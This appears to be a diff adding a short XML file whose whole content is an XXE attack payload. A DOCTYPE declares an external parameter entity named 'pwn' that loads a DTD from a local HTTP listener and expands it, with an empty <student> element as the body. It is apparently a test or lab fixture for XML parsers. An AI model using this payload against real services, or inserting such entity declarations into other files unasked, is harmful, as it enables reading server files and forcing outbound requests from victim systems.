@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<!DOCTYPE student [
+
+<!ENTITY % pwn SYSTEM "http://127.0.0.1:1235/s.dtd" >
+%pwn;
+]
+>
+
+<student>
+	
+</student>
+
+
